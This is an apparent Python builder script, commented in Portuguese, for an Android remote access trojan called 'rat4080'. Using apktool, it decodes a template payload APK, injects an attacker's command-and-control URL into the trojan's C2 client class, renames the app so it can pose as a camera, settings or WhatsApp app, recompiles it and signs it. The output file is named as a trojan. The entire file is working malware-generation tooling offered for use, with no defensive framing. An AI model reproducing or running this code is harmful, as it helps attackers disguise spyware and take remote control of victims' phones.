#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gerador de APK — Injeta URL do C2 e recompila o payload
"""

import os
import shutil
import subprocess
import tempfile
from pathlib import Path

PAYLOAD_DIR = Path(__file__).parent.parent / 'payload'
OUTPUT_DIR = Path(__file__).parent.parent / 'output'
TEMPLATE_APK = PAYLOAD_DIR / 'template' / 'payload_template.apk'
APKTOOL_PATH = shutil.which('apktool')
JAVA_PATH = shutil.which('java')

ICONS = {
    'camera': 'ic_camera',
    'settings': 'ic_settings',
    'gallery': 'ic_gallery',
    'browser': 'ic_browser',
    'whatsapp': 'ic_whatsapp'
}

def generate_apk(apk_name, c2_url, icon_type='camera'):
    """
    Gera um APK personalizado com o C2 injetado
    
    Args:
        apk_name: Nome visível da aplicação
        c2_url: URL do servidor C2 (ws://host:porta)
        icon_type: Tipo de ícone a usar
    
    Returns:
        Caminho para o APK gerado ou None em caso de falha
    """
    if not APKTOOL_PATH:
        print("[-] apktool não encontrado. Instala: apt install apktool")
        return None
    
    if not c2_url:
        print("[-] URL do C2 é obrigatória")
        return None
    
    OUTPUT_DIR.mkdir(exist_ok=True)
    
    # Cria diretório temporário
    temp_dir = tempfile.mkdtemp(prefix='apk_build_')
    decoded_dir = os.path.join(temp_dir, 'decoded')
    
    print(f"[+] A descodificar template APK...")
    
    # Descodifica o APK template
    result = subprocess.run(
        [APKTOOL_PATH, 'd', str(TEMPLATE_APK), '-o', decoded_dir, '-f'],
        capture_output=True,
        text=True
    )
    
    if result.returncode != 0:
        print(f"[-] Falha ao descodificar: {result.stderr}")
        return None
    
    # Injeta URL do C2
    print(f"[+] A injetar C2: {c2_url}")
    
    # Procura a classe C2Client.java no smali
    smali_dirs = list(Path(decoded_dir).rglob('smali*'))
    c2_client_file = None
    
    for smali_dir in smali_dirs:
        potential = smali_dir / 'com' / 'rat4080' / 'trojan' / 'C2Client.smali'
        if potential.exists():
            c2_client_file = potential
            break
    
    if c2_client_file:
        with open(c2_client_file, 'r') as f:
            content = f.read()
        
        # Substitui o URL do C2
        content = content.replace('ws://10.0.0.1:5000', c2_url)
        content = content.replace('http://10.0.0.1:5000', c2_url.replace('ws', 'http'))
        
        with open(c2_client_file, 'w') as f:
            f.write(content)
    
    # Muda o nome da aplicação
    manifest_file = Path(decoded_dir) / 'AndroidManifest.xml'
    if manifest_file.exists():
        with open(manifest_file, 'r') as f:
            content = f.read()
        
        content = content.replace('@string/app_name', apk_name)
        
        with open(manifest_file, 'w') as f:
            f.write(content)
    
    # Muda o ícone
    if icon_type in ICONS:
        icon_name = ICONS[icon_type]
        res_dirs = list(Path(decoded_dir).glob('res'))
        for res_dir in res_dirs:
            for density in ['mipmap-*', 'drawable-*']:
                icon_dirs = list(res_dir.glob(density))
                for icon_dir in icon_dirs:
                    # Substitui ic_launcher pelo ícone escolhido
                    pass  # A substituição real de ícones requer assets binários
    
    # Recompila o APK
    print(f"[+] A recompilar APK...")
    output_apk = os.path.join(temp_dir, 'payload_unsigned.apk')
    
    result = subprocess.run(
        [APKTOOL_PATH, 'b', decoded_dir, '-o', output_apk],
        capture_output=True,
        text=True
    )
    
    if result.returncode != 0:
        print(f"[-] Falha ao recompilar: {result.stderr}")
        return None
    
    # Assina o APK
    print(f"[+] A assinar APK...")
    
    # Gera chave de assinatura se não existir
    keystore = OUTPUT_DIR / 'debug.keystore'
    if not keystore.exists():
        subprocess.run([
            'keytool', '-genkey', '-v',
            '-keystore', str(keystore),
            '-alias', 'rat4080',
            '-keyalg', 'RSA',
            '-keysize', '2048',
            '-validity', '10000',
            '-storepass', 'rat4080',
            '-keypass', 'rat4080',
            '-dname', 'CN=Rat4080, OU=Dev, O=Rat, L=Nest, S=Walls, C=XX'
        ], capture_output=True)
    
    final_apk = OUTPUT_DIR / f'{apk_name.replace(" ", "_")}_trojan.apk'
    
    # Usa uber-apk-signer ou jarsigner
    signer = shutil.which('uber-apk-signer')
    if signer:
        subprocess.run([
            signer,
            '-a', output_apk,
            '--ks', str(keystore),
            '--ksAlias', 'rat4080',
            '--ksPass', 'rat4080',
            '--ksKeyPass', 'rat4080',
            '--out', str(OUTPUT_DIR)
        ], capture_output=True)
        
        # Procura o APK assinado
        signed_apks = list(OUTPUT_DIR.glob('*-aligned-signed.apk'))
        if signed_apks:
            shutil.copy(signed_apks[0], final_apk)
    else:
        # Fallback para jarsigner
        jarsigner = shutil.which('jarsigner')
        if jarsigner:
            subprocess.run([
                jarsigner,
                '-keystore', str(keystore),
                '-storepass', 'rat4080',
                '-keypass', 'rat4080',
                output_apk,
                'rat4080'
            ], capture_output=True)
            shutil.copy(output_apk, final_apk)
    
    # Limpa
    shutil.rmtree(temp_dir, ignore_errors=True)
    
    print(f"[+] APK gerado: {final_apk}")
    return str(final_apk)

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 3:
        print("Uso: python gerador_apk.py <nome_app> <c2_url> [icon_type]")
        sys.exit(1)
    
    apk_name = sys.argv[1]
    c2_url = sys.argv[2]
    icon_type = sys.argv[3] if len(sys.argv) > 3 else 'camera'
    
    result = generate_apk(apk_name, c2_url, icon_type)
    if result:
        print(f"[+] Sucesso! APK em: {result}")
    else:
        print("[-] Falha na geração")
        sys.exit(1)
